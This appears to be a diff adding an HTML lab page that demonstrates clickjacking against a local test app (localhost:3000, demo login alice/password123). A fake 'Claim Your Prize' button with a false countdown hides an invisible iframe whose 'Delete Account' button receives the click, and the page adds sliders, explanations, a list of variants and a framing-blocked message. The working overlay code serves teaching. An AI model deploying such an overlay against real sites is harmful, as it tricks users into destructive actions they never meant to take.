@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎁 Congratulations! You Won!</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 20px;
+      color: white;
+    }
+
+    h1 { font-size: 48px; margin-bottom: 8px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+    .subtitle { font-size: 20px; opacity: 0.9; margin-bottom: 20px; }
+
+    /* ============================================= */
+    /* IMPORTANT: Login reminder                      */
+    /* ============================================= */
+    .login-reminder {
+      background: rgba(231, 76, 60, 0.3);
+      border: 2px solid rgba(231, 76, 60, 0.7);
+      padding: 12px 24px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      font-size: 15px;
+      text-align: center;
+      max-width: 620px;
+    }
+    .login-reminder a { color: #ffd700; font-weight: 700; }
+
+    /* ============================================= */
+    /* THE ATTACK CONTAINER                           */
+    /* ============================================= */
+    .attack-container {
+      position: relative;
+      width: 620px;
+      height: 260px;
+      overflow: hidden;
+      border-radius: 16px;
+    }
+
+    /* The VISIBLE fake content the user sees */
+    .fake-content {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.3);
+      z-index: 1; /* BELOW the iframe */
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 40px;
+      color: #333;
+    }
+
+    .fake-content .prize-emoji { font-size: 48px; margin-bottom: 8px; }
+    .fake-content h2 { font-size: 24px; color: #2c3e50; margin-bottom: 8px; }
+    .fake-content p { color: #666; font-size: 14px; margin-bottom: 20px; text-align: center; line-height: 1.4; }
+
+    /* Fake button — user THINKS they're clicking this.
+       Actually the invisible iframe's Delete button is on top. */
+    .fake-btn {
+      padding: 16px 48px;
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 20px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 4px 15px rgba(245, 87, 108, 0.4);
+    }
+
+    .timer-text {
+      margin-top: 12px; font-size: 12px; color: #999;
+    }
+
+    /* ============================================= */
+    /* THE INVISIBLE IFRAME                           */
+    /* ============================================= */
+    .attack-iframe {
+      position: absolute;
+      z-index: 2; /* ABOVE the fake content — receives clicks */
+      border: none;
+      opacity: 0; /* invisible by default */
+      pointer-events: auto; /* clicks go to iframe */
+      /*
+        Position the iframe so the "Delete Account" button in the
+        settings page lines up over the "Claim Prize" button.
+        Adjust top/left with the sliders below to fine-tune!
+      */
+      top: -120px;
+      left: 0px;
+      width: 620px;
+      height: 600px;
+    }
+
+    /* ============================================= */
+    /* GOTCHA overlay — shown after successful attack */
+    /* ============================================= */
+    .gotcha-overlay {
+      display: none;
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.92);
+      z-index: 50;
+      border-radius: 16px;
+      color: white;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+    .gotcha-overlay.show { display: flex; }
+    .gotcha-overlay h2 { font-size: 28px; color: #e74c3c; margin-bottom: 8px; }
+    .gotcha-overlay p { font-size: 14px; opacity: 0.8; line-height: 1.5; }
+
+    /* Blocked message */
+    .blocked-msg {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0,0,0,0.92);
+      color: #2ecc71;
+      padding: 20px 30px;
+      border-radius: 12px;
+      z-index: 100;
+      font-size: 16px;
+      font-weight: 700;
+      text-align: center;
+      display: none;
+    }
+
+    /* ============================================= */
+    /* CONTROLS (for learning)                        */
+    /* ============================================= */
+    .controls {
+      margin-top: 20px;
+      background: rgba(255,255,255,0.15);
+      backdrop-filter: blur(10px);
+      padding: 16px 24px;
+      border-radius: 12px;
+      max-width: 620px;
+      width: 100%;
+    }
+    .controls h3 { font-size: 14px; margin-bottom: 12px; opacity: 0.9; }
+
+    .control-row {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+    .control-row label { font-size: 13px; min-width: 70px; }
+    .control-row input[type="range"] { flex: 1; }
+    .control-row span { font-size: 13px; font-family: monospace; min-width: 50px; }
+    .control-row input[type="checkbox"] { transform: scale(1.2); }
+
+    /* ============================================= */
+    /* INFO PANELS                                    */
+    /* ============================================= */
+    .info-panel {
+      margin-top: 16px;
+      max-width: 620px;
+      width: 100%;
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(10px);
+      padding: 16px 20px;
+      border-radius: 12px;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+    .info-panel h3 { margin-bottom: 8px; font-size: 15px; }
+    .info-panel code { background: rgba(255,255,255,0.2); padding: 2px 6px; border-radius: 4px; }
+    .info-panel .step { margin: 4px 0; padding-left: 16px; }
+
+    .attack-methods {
+      max-width: 620px;
+      width: 100%;
+      margin-top: 16px;
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(10px);
+      padding: 16px 20px;
+      border-radius: 12px;
+    }
+    .attack-methods h3 { margin-bottom: 10px; font-size: 15px; }
+    .method { margin: 10px 0; padding: 10px; background: rgba(255,255,255,0.1); border-radius: 8px; }
+    .method h4 { margin-bottom: 4px; font-size: 13px; }
+    .method p { font-size: 12px; opacity: 0.85; line-height: 1.4; }
+  </style>
+</head>
+<body>
+  <h1>🎁 Congratulations!</h1>
+  <p class="subtitle">You've been selected for a special prize!</p>
+
+  <!-- IMPORTANT: Login reminder -->
+  <div class="login-reminder">
+    ⚠️ <strong>First:</strong> Make sure you're logged in at
+    <a href="http://localhost:3000" target="_blank">localhost:3000</a>
+    (alice / password123) — then come back here and click the button!
+  </div>
+
+  <!-- Attack Container -->
+  <div class="attack-container" id="attack-container">
+    <!-- Fake content the user sees -->
+    <div class="fake-content" id="fake-content">
+      <div class="prize-emoji">🎁🏆</div>
+      <h2>You Won a Free iPhone!</h2>
+      <p>Click below to claim your prize before it expires!</p>
+      <button class="fake-btn" id="fake-btn">🎁 Claim Your Prize!</button>
+      <p class="timer-text">
+        Offer expires in <span id="countdown">59</span> seconds!
+      </p>
+    </div>
+
+    <!-- Invisible iframe loading the REAL site's settings page -->
+    <iframe
+      class="attack-iframe"
+      id="attack-iframe"
+      src="http://localhost:3000/settings"
+    ></iframe>
+
+    <!-- Gotcha overlay — shown after account is deleted -->
+    <div class="gotcha-overlay" id="gotcha-overlay">
+      <h2>💀 GOTCHA!</h2>
+      <p>You just clicked "Delete My Account" on the real site!<br>
+      Your account has been deleted. Check the terminal for proof.</p>
+    </div>
+
+    <!-- Blocked message (shown when defense works) -->
+    <div class="blocked-msg" id="blocked-msg">
+      🛡️ IFRAME BLOCKED!<br>
+      <span style="font-size: 13px; font-weight: 400; color: #aaa;">
+        Server headers prevented loading in an iframe.
+      </span>
+    </div>
+  </div>
+
+  <!-- Learning Controls -->
+  <div class="controls">
+    <h3>🔧 Developer Controls (for learning — an attacker would hide these)</h3>
+
+    <div class="control-row">
+      <label>👁️ Opacity:</label>
+      <input type="range" id="opacity-slider" min="0" max="100" value="0">
+      <span id="opacity-value">0%</span>
+    </div>
+
+    <div class="control-row">
+      <label>⬆️ Top offset:</label>
+      <input type="range" id="top-slider" min="-400" max="200" value="-120">
+      <span id="top-value">-120px</span>
+    </div>
+
+    <div class="control-row">
+      <label>⬅️ Left offset:</label>
+      <input type="range" id="left-slider" min="-200" max="200" value="0">
+      <span id="left-value">0px</span>
+    </div>
+
+    <div class="control-row">
+      <label>
+        <input type="checkbox" id="toggle-pointer" checked>
+        Clicks pass through to iframe
+      </label>
+    </div>
+  </div>
+
+  <!-- How it works -->
+  <div class="info-panel">
+    <h3>🔍 How This Attack Works</h3>
+    <div class="step">1️⃣ You log into <code>localhost:3000</code> (the legit app)</div>
+    <div class="step">2️⃣ This page loads <code>localhost:3000/settings</code> in an INVISIBLE iframe</div>
+    <div class="step">3️⃣ The iframe is positioned so "Delete Account" sits under "Claim Prize"</div>
+    <div class="step">4️⃣ When you click "Claim Prize", you actually click "Delete Account"!</div>
+    <div class="step">5️⃣ Since you're logged in, the action succeeds — your account is deleted</div>
+    <br>
+    <div class="step">💡 <strong>Use the opacity slider</strong> to reveal the hidden iframe!</div>
+    <div class="step">💡 <strong>Use the top/left sliders</strong> to see how alignment works!</div>
+    <div class="step">💡 <strong>Check the terminal</strong> for 💀 ACCOUNT DELETED after clicking!</div>
+  </div>
+
+  <!-- Attack variations -->
+  <div class="attack-methods">
+    <h3>🎯 Clickjacking Variations</h3>
+
+    <div class="method">
+      <h4>1. Classic Clickjacking (this demo)</h4>
+      <p>Invisible iframe + fake button overlay. User thinks they click one thing, actually clicks another.</p>
+    </div>
+
+    <div class="method">
+      <h4>2. Likejacking</h4>
+      <p>Hidden Facebook "Like" button under a fake button. User unknowingly likes an attacker's page.</p>
+    </div>
+
+    <div class="method">
+      <h4>3. Cursorjacking</h4>
+      <p>Custom CSS cursor offset from the real cursor position. User clicks in the wrong place.</p>
+    </div>
+
+    <div class="method">
+      <h4>4. Multi-step Clickjacking</h4>
+      <p>Tricking user through a series of clicks — e.g., a "game" where each click changes their settings.</p>
+    </div>
+
+    <div class="method">
+      <h4>5. Drag-and-Drop Clickjacking</h4>
+      <p>User drags an element in a "game" but actually drags data across iframe boundaries.</p>
+    </div>
+  </div>
+
+  <script>
+    // ============================================
+    // CONTROL ELEMENTS
+    // ============================================
+    const iframe = document.getElementById('attack-iframe');
+    const fakeBtn = document.getElementById('fake-btn');
+    const container = document.getElementById('attack-container');
+
+    // Opacity slider
+    const opacitySlider = document.getElementById('opacity-slider');
+    const opacityValue = document.getElementById('opacity-value');
+    opacitySlider.addEventListener('input', () => {
+      const val = opacitySlider.value / 100;
+      iframe.style.opacity = val;
+      opacityValue.textContent = opacitySlider.value + '%';
+    });
+
+    // Top position slider
+    const topSlider = document.getElementById('top-slider');
+    const topValue = document.getElementById('top-value');
+    topSlider.addEventListener('input', () => {
+      iframe.style.top = topSlider.value + 'px';
+      topValue.textContent = topSlider.value + 'px';
+    });
+
+    // Left position slider
+    const leftSlider = document.getElementById('left-slider');
+    const leftValue = document.getElementById('left-value');
+    leftSlider.addEventListener('input', () => {
+      iframe.style.left = leftSlider.value + 'px';
+      leftValue.textContent = leftSlider.value + 'px';
+    });
+
+    // Pointer events toggle
+    const togglePointer = document.getElementById('toggle-pointer');
+    togglePointer.addEventListener('change', () => {
+      if (togglePointer.checked) {
+        iframe.style.pointerEvents = 'auto';
+      } else {
+        iframe.style.pointerEvents = 'none';
+      }
+    });
+
+    // ============================================
+    // FAKE COUNTDOWN TIMER (urgency trick)
+    // ============================================
+    let seconds = 59;
+    const countdownEl = document.getElementById('countdown');
+    setInterval(() => {
+      seconds--;
+      if (seconds <= 0) seconds = 59;
+      countdownEl.textContent = seconds;
+    }, 1000);
+
+    // ============================================
+    // DETECT ACCOUNT DELETION
+    // ============================================
+    // When the Delete form submits inside the iframe, the iframe
+    // navigates from /settings to /login. We detect this 2nd load.
+    let iframeLoads = 0;
+    iframe.addEventListener('load', () => {
+      iframeLoads++;
+      console.log(`iframe load #${iframeLoads}`);
+
+      // First load = initial /settings page
+      // Second load = form submitted → account deleted → /login page
+      if (iframeLoads >= 2) {
+        document.getElementById('gotcha-overlay').classList.add('show');
+        console.log('💀 Clickjacking successful! Account deleted via iframe.');
+      }
+
+      // Check if iframe was blocked by X-Frame-Options or CSP
+      try {
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        if (!iframeDoc || !iframeDoc.body || iframeDoc.body.innerHTML === '') {
+          document.getElementById('blocked-msg').style.display = 'block';
+        }
+      } catch (e) {
+        console.log('Cannot access iframe content (cross-origin)');
+      }
+    });
+
+    iframe.addEventListener('error', () => {
+      document.getElementById('blocked-msg').style.display = 'block';
+    });
+  </script>
+</body>
+</html>
